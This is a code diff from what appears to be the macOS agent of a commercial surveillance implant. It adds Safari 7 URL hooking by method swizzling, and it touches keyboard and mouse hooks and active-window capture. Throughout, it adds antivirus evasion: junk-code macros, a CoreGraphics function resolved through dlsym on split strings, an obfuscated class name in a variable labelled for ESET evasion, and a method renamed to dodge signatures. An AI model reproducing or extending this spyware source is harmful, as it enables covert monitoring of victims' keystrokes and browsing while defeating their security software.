@@ -33,6 +33,7 @@
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
+#import "NSProcessInfo+NSProcessInfo__AVEvasion_.h"
 #import "RCSMAVGarbage.h"
 
 #define swizzleMethod(c1, m1, c2, m2) do { \
@@ -68,6 +69,8 @@ static int voipFlag         = 0;
 static int appFlag          = 0;
 static int fileFlag         = 0;
 
+CFArrayRef (*pCGWindowListCopyWindowInfo)(CGWindowListOption, CGWindowID);
+
 NSDictionary *getActiveWindowInformationForPID(pid_t pid)
 {
   ProcessSerialNumber psn = { 0,0 };
@@ -95,7 +98,7 @@ NSDictionary *getActiveWindowInformationForPID(pid_t pid)
     return nil;
   
   // Window list front to back
-  windowsList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenAboveWindow,
+  windowsList = pCGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenAboveWindow,
                                            kCGNullWindowID);
   
   if (windowsList == NULL)
@@ -270,6 +273,24 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   [__m_MLogger enableProcessNameVisualization: YES];
 #endif
   
+  if (pCGWindowListCopyWindowInfo == NULL)
+  {
+    void *handle = dlopen("/System/Library/Frameworks/CoreGraphics.framework/Versions/Current/CoreGraphics", 2);
+    
+    // for 10.7.x
+    if (handle == NULL)
+      handle = dlopen("/System/Library/Frameworks/ApplicationServices.framework/Versions/A/Frameworks/CoreGraphics.framework/Versions/Current/CoreGraphics", 2);
+    
+    if (handle != NULL)
+    {
+      char funcName[256];
+      
+      sprintf(funcName, "CGWindowList%s%s","Copy", "WindowInfo");
+      
+      pCGWindowListCopyWindowInfo = dlsym(handle, funcName);
+    }
+  }
+
   // AV evasion: only on release build
   AV_GARBAGE_002 
 
@@ -450,7 +471,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
     }
 }
 
-+ (BOOL)isACrisisApp
++ (BOOL)isACrsApp
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
@@ -460,7 +481,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   NSMutableData *readData;
   shMemoryCommand *shMemCommand;
   BOOL retVal = NO;
-  NSProcessInfo *pi = [NSProcessInfo processInfo];  
+  NSProcessInfo *pi = [NSProcessInfo PROCESSINFO_SEL];  
   
   // AV evasion: only on release build
   AV_GARBAGE_002 
@@ -617,7 +638,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
     // AV evasion: only on release build
     AV_GARBAGE_003 
 
-    if ([self isACrisisApp])
+    if ([self isACrsApp])
     {   
       // AV evasion: only on release build
       AV_GARBAGE_004 
@@ -805,28 +826,13 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
           // AV evasion: only on release build
           AV_GARBAGE_000
           
-          /*
-           * for Safari 6.x only
-           */
-          Class LocationTextFieldClass = objc_getClass("LocationTextField");
-          
-          // AV evasion: only on release build
-          AV_GARBAGE_004
-          
           Class BrowserWindowClass = objc_getClass("BrowserWindow");
           
           // AV evasion: only on release build
           AV_GARBAGE_005
           
-          if (LocationTextFieldClass != nil && BrowserWindowClass != nil)
+          if (BrowserWindowClass != nil)
           {
-            // AV evasion: only on release build
-            AV_GARBAGE_003
-            
-            swizzleByAddingIMP (LocationTextFieldClass, @selector(_drawTopLocationTextField:),
-                                class_getMethodImplementation(classSource, @selector(_drawTopLocationTextFieldHook:)),
-                                @selector(_drawTopLocationTextFieldHook:));
-            
             // AV evasion: only on release build
             AV_GARBAGE_007
             
@@ -837,6 +843,46 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
             // AV evasion: only on release build
             AV_GARBAGE_005
           }
+          
+          /*
+           * for Safari 6.x only
+           */
+          Class LocationTextFieldClass = objc_getClass("LocationTextField");
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+          
+          if (LocationTextFieldClass != nil)
+          {
+            // AV evasion: only on release build
+            AV_GARBAGE_003
+            
+            swizzleByAddingIMP (LocationTextFieldClass, @selector(_drawTopLocationTextField:),
+                                class_getMethodImplementation(classSource, @selector(_drawTopLocationTextFieldHook:)),
+                                @selector(_drawTopLocationTextFieldHook:));
+          }
+          
+          /*
+           * for Safari 7.x only
+           */
+          Class BrowserContentViewControllerObjCAdapterClass = objc_getClass("BrowserContentViewControllerObjCAdapter");
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_005
+          
+          if (BrowserContentViewControllerObjCAdapterClass != nil)
+          {
+            // AV evasion: only on release build
+            AV_GARBAGE_007
+            
+            swizzleByAddingIMP (BrowserContentViewControllerObjCAdapterClass, @selector(expectedOrCurrentURL),
+                                class_getMethodImplementation(classSource, @selector(expectedOrCurrentURLHook)),
+                                @selector(expectedOrCurrentURLHook));
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_005
+          }
+
         }
       }
       else
@@ -980,27 +1026,13 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
           // AV evasion: only on release build
           AV_GARBAGE_002
           
-          /*
-           * for Safari 6.x only
-           */
-          Class LocationTextFieldClass = objc_getClass("LocationTextField");
-          
-          // AV evasion: only on release build
-          AV_GARBAGE_004
-          
           Class BrowserWindowClass = objc_getClass("BrowserWindow");
           
           // AV evasion: only on release build
           AV_GARBAGE_005
           
-          if (LocationTextFieldClass != nil && BrowserWindowClass != nil)
+          if (BrowserWindowClass != nil)
           {
-            // AV evasion: only on release build
-            AV_GARBAGE_003
-            
-            swizzleMethod(LocationTextFieldClass, @selector(_drawTopLocationTextField:),
-                          LocationTextFieldClass, @selector(_drawTopLocationTextFieldHook:));
-
             // AV evasion: only on release build
             AV_GARBAGE_007
             
@@ -1010,7 +1042,49 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
             // AV evasion: only on release build
             AV_GARBAGE_005
           }
+          
+          /*
+           * for Safari 6.x only
+           */
+          Class LocationTextFieldClass = objc_getClass("LocationTextField");
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+          
+          if (LocationTextFieldClass != nil)
+          {
+            // AV evasion: only on release build
+            AV_GARBAGE_003
+            
+            swizzleMethod(LocationTextFieldClass, @selector(_drawTopLocationTextField:),
+                          LocationTextFieldClass, @selector(_drawTopLocationTextFieldHook:));
 
+            // AV evasion: only on release build
+            AV_GARBAGE_007
+          }
+          
+          /*
+           * for Safari 7.x only
+           */
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+          
+          Class BrowserContentViewControllerObjCAdapterClass = objc_getClass("BrowserContentViewControllerObjCAdapter");
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_005
+          
+          if (BrowserContentViewControllerObjCAdapterClass != nil)
+          {
+            // AV evasion: only on release build
+            AV_GARBAGE_003
+            
+            swizzleMethod(BrowserContentViewControllerObjCAdapterClass, @selector(expectedOrCurrentURL),
+                          BrowserContentViewControllerObjCAdapterClass, @selector(expectedOrCurrentURLHook));
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_007
+          }
         }
       }
       else
@@ -1155,7 +1229,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       if (mouseFlag == 0 || mouseAgentIsActive == 0)
       {
 #ifdef DEBUG_INPUT_MANAGER
-        infoLog(@"Hooking keyboard");
+        NSLog(@"Hooking keyboard");
 #endif
         
         // AV evasion: only on release build
@@ -1259,7 +1333,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       if (keyboardFlag == 0 || keylogAgentIsActive == 0)
       {
 #ifdef DEBUG_INPUT_MANAGER
-        infoLog(@"Hooking mouse");
+        NSLog(@"Hooking mouse");
 #endif
         
         // AV evasion: only on release build
@@ -1403,8 +1477,12 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 #endif   
         // AV evasion: only on release build
         AV_GARBAGE_003 
-
-        Class className   = objc_getClass("AIContentController");
+        
+        char esetEvasionAIContentController[256];
+        
+        sprintf(esetEvasionAIContentController, "AI%s%s", "Content", "Controller");
+        
+        Class className   = objc_getClass(esetEvasionAIContentController);
         
         // AV evasion: only on release build
         AV_GARBAGE_003 
